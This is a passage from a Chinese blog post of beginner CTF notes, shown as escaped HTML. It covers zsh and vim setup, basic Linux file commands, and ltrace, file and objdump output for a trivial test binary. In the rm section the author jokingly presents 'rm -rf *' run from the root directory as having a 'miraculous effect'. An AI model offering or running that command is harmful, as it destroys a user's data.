autoload -U colors &amp;amp;&amp;amp; colors

# 每次刷新提示符
setopt prompt_subst

# 设置提示符, 这里就有很多可以自定义的东西
PROMPT='( %{$fg[green]%}%n%{$reset_color%}|%{$fg[yellow]%}%1~%{$reset_color%}%{$fg[blue]%}$(git branch --show-current 2&amp;amp;&amp;gt; /dev/null | xargs -I branch echo &quot;(branch)&quot;)%{$reset_color%} ) '
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最后一般选择把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt;设置为默认的终端.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chsh -s /bin/zsh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;完事. (退出后重开就是了, 或者直接&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt;玩. )&lt;/p&gt;

&lt;h3 id=&quot;vim&quot;&gt;VIM&lt;/h3&gt;
&lt;p&gt;文本编辑器, 据说用得溜的话是很强的, 可惜我不是很擅长.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;打开或者新建文件: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim file_name&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;进入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt;后有不同的模式, 按&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esc&lt;/code&gt;键会回到普通的模式&lt;/li&gt;
  &lt;li&gt;在普通模式下按&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i&lt;/code&gt;键会进入编辑模式, 可以输入代码&lt;/li&gt;
  &lt;li&gt;在普通模式下按&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;j&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;k&lt;/code&gt;可以上下移动光标, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;h&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l&lt;/code&gt;可以左右移动&lt;/li&gt;
  &lt;li&gt;在普通模式下按&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt;删除光标所在的字符, 按&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt;可以替换字符, 
按&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dd&lt;/code&gt;可以删除行, 按&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;是剪切行, 按&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p&lt;/code&gt;是粘贴到下一行, 按&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u&lt;/code&gt;是撤销&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;目前会的就这么点.&lt;/p&gt;

&lt;p&gt;(注: 可以试试编辑&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.vimrc&lt;/code&gt;文件来配置, 比如我用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby&lt;/code&gt;比较多, 
习惯用两个空格来缩进, 所以我就&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set tabstop=2&lt;/code&gt;来配置. 
不过其他的就不知道了. )&lt;/p&gt;

&lt;h3 id=&quot;vscode&quot;&gt;VSCode&lt;/h3&gt;
&lt;p&gt;从零开始写代码的话, 用这玩意很方便的, 并且还是图形界面, 香啊.&lt;/p&gt;

&lt;p&gt;插件也很多, 补全(虽然有时候很闹心), 但是很棒.&lt;/p&gt;

&lt;h2 id=&quot;others&quot;&gt;Others&lt;/h2&gt;
&lt;h3 id=&quot;linux-simple&quot;&gt;LINUX SIMPLE&lt;/h3&gt;
&lt;p&gt;我只会一点点的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux&lt;/code&gt;的操作.&lt;/p&gt;

&lt;p&gt;不过好像只要会一点点的文件游览技术就够了吧? 
毕竟我好像平时也只会用到这些.&lt;/p&gt;

&lt;p&gt;(详细的话, 有一个
&lt;a href=&quot;https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/index.html&quot;&gt;网站&lt;/a&gt;
很不错. )&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man&lt;/code&gt; 命令, 查找东西的时候很好用, 比如遇到一个不知道的(系统)函数, 
自己不是很清楚, 就&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man function&lt;/code&gt;一下. 类似还有:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man -k&lt;/code&gt;关键词搜索&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatis&lt;/code&gt;返回简要的介绍说明, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info&lt;/code&gt;可以返回更具体的介绍&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;文件管理
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir&lt;/code&gt;新建文件夹&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rm&lt;/code&gt;删除文件, 删除文件夹的话用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rm -r&lt;/code&gt;, 删除非空文件夹&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rm -rf&lt;/code&gt;. 
(温馨提示, 在根目录下执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rm -rf *&lt;/code&gt;会有奇效, 
建议理解了上面说明的酌情在虚拟机内运行. )&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mv source dest&lt;/code&gt;移动文件(也可以用来重命名就是了), 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cp source dest&lt;/code&gt;复制&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwd&lt;/code&gt;当前所在位置&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt;打开文件夹(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd ..&lt;/code&gt;打开上级文件夹)&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;列出当前文件夹中的东西, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -a&lt;/code&gt;列出所有, 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -lah&lt;/code&gt;还可以看文件权限&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt;修改文件权限, 比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod a+x test&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;设置可执行&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt;查找文件, 看起来很强, 没用过&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt;文本搜索, 配合&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt;食用很好.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ltrace&quot;&gt;LTRACE&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ltrace&lt;/code&gt;是一个好东西, 可以看到程序对系统的函数库的调用关系. 
虽然不一定十分好用, 但是有些时候可以从里面得到一些思路, 
比如说有什么&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcmp&lt;/code&gt;之类的调用, 就可以理解为是有一个比较判断, 
这样的话就可以有一些突破口了. (比如在那个条件判断上干一票. )&lt;/p&gt;

&lt;p&gt;举个例子:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt; ltrace ./test 
__libc_start_main(0xaaaace33b76c, 1, 0xffffda82f578, 0xaaaace33b790 &amp;lt;unfinished ...&amp;gt;
puts(&quot;Test&quot;Test
)                                                  = 5
__cxa_finalize(0xaaaace34c008, 0xaaaace33b720, 0x10d88, 0xffffaf594a78) = 0xffffaf5617a0
+++ exited (status 0) +++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;是下面的文件编译的程序.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
  
int main()
{
        printf(&quot;Test\n&quot;);
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt;函数的调用.&lt;/p&gt;

&lt;h3 id=&quot;file&quot;&gt;FILE&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;命令可以看出这个文件是什么东西, 是什么类别之类的东西.&lt;/p&gt;

&lt;p&gt;举个例子:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt; file test
test: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID[sha1]=dee186d96a475fe75a8c030063698e57c64d1396, for GNU/Linux 3.7.0, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到这里面的有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ARM aarch64&lt;/code&gt;的标志, 表示这个程序是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arm&lt;/code&gt;架构的,
等等.&lt;/p&gt;

&lt;h3 id=&quot;objdump&quot;&gt;OBJDUMP&lt;/h3&gt;
&lt;p&gt;类似一个反编译的东西, 通过这个可以看到一些信息.&lt;/p&gt;

&lt;p&gt;举个例子:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt; objdump -D test | grep \&amp;lt;main\&amp;gt; -A10
000000000000076c &amp;lt;main&amp;gt;:
 76c:   a9bf7bfd        stp     x29, x30, [sp, #-16]!
 770:   910003fd        mov     x29, sp
 774:   90000000        adrp    x0, 0 &amp;lt;_init-0x5d0&amp;gt;
 778:   9120c000        add     x0, x0, #0x830
 77c:   97ffffb5        bl      650 &amp;lt;puts@plt&amp;gt;
 780:   52800000        mov     w0, #0x0                        // #0
 784:   a8c17bfd        ldp     x29, x30, [sp], #16
 788:   d65f03c0        ret
 78c:   d503201f        nop
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;等等&quot;&gt;等等&lt;/h3&gt;
&lt;p&gt;虽然目前我就只用了这些(虽然也不太熟). 以后再多接触吧, 笑.&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><summary type="html">Untitled (02) 这里记录一些打ctf中遇到的很多的东西和技术.</summary></entry></feed>